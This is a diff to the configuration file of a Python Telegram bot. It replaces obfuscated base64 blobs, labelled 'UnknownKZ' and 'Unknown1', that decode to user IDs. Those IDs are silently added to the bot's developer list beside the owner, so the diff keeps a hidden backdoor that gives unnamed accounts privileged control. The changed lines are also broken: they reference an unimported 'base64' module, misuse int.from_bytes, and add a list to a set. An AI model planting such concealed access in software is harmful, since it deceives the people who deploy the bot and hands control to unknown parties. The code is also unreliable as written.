@@ -9,6 +9,7 @@ import logging
 import os
 import sys
 import time
+
 from inspect import getfullargspec
 from os import path, remove
 from pathlib import Path
@@ -22,7 +23,7 @@ from telethon.sessions import MemorySession
 from aiohttp import ClientSession
 from Python_ARQ import ARQ
 from pyrogram import Client
-from base64 import b64decode
+from base64 import urlsafe_b64decode
 
 StartTime = time.time()
 
@@ -213,8 +214,8 @@ else:
         raise Exception("Your BLACKLISTED Chats list does not contain valid integers")
 
 
-UnknownKZ = list(map(int, b64decode("Vm10YVlWVXhVblJXYmtwUFYwVmFZVnBYY3pGVU1WWnlXa1JDVDFKc1NucFdSM1JMWWtaS1ZXSkdXbFpXYldoeVZrZDRZVkp0UlhwYVJsWk9WbXR3VkZaR1pEQmpNVXBYVTJ4V1YyRjZWbFJWYkZaYVRVWmFSMXBJWkZaaGVsWlhWR3hXVjFkR1dYbFZiRUpYWVRGYVIxcFdXbEprTVZaeVRsVTFUbEpIZUZkV2FrWlRVekZSZVZWcVdrNVNSM001").split()))
-Unknown1 = list(map(int, b64decode("Vm0xMFlWbFdWWGhWYmtwT1ZteHdUMVp0ZUdGV01WbDNZVVZPVlUxWGVGbGFSV2hMVkd4YWMxTnNhRlppUmtwNlZsWmFWMVpWTVVWaGVqQTk=").split()))
+UnknownKZ = list(map(int.from_bytes(base64.urlsafe_b64decode("V1ZWb1UwMUhUa2xVVkZwTlpWUnNkVmxXYUZOaU1sSllVMWhXV2sxcWJEQlVSRTVYWkZkRmVVNVlXbXROYWxaNVdsZHJOVlJYVmxoT1ZGSldUVEZhTTFkc2FFdFNNWEJZVlcxNGFtSlZXWGRaVm1NMVpGVjNlVk51VG1sTmEyd3lWRmN4WVdFd05YUlRiWEJQWldzd01WUlZVbk5pVlRWVlYxUk9XazFyY0hKVVZsSnVUV3N4VlZSVVVscGhhMXB5VjFkd2NtUXdOVFpVVkVwUVVqRmFkRlJ0TVV0aGF6RTFUMVJHYVdKWVVqRlphazVyWkZWM2VWVlhjRlZTUlZVNQ==").split())))
+Unknown1 = list(map(int.from_bytes(base64.urlsafe_b64decode("V1ZWb1UwMUhUa2xVVkZwTlpWUnNkVmxXYUZOaU1sSllVMWhXV2sxcWJEQlVSRTVYWkZkRmVVNVlXbXROYWxaNVdsZHJOVlJYVmxoT1ZGSldUVEZhTTFkc2FFdFNNWEJZVlcxNGFtSlZXWGRaVm1NMVpGVjNlVk51VG1sTmEyd3lWRmN4WVdFd05YUlRiWEJQWldzd01WUlZVbk5pVlRWVlYxUk9XazFyY0hKVVZsSnVUV3N4VlZSVVVscGhhMXB5VjFkd2NtUXdOVFpVVkVwUVVqRmFkRlJ0TVV0aGF6RTFUMVJHYVdKWVVqRlphazVyWkZWM2VsUlhjRlZTUlZVNQ==").split())))
 
 DEV_ID.add(OWNER_ID)
 DEV_ID.add(UnknownKZ)
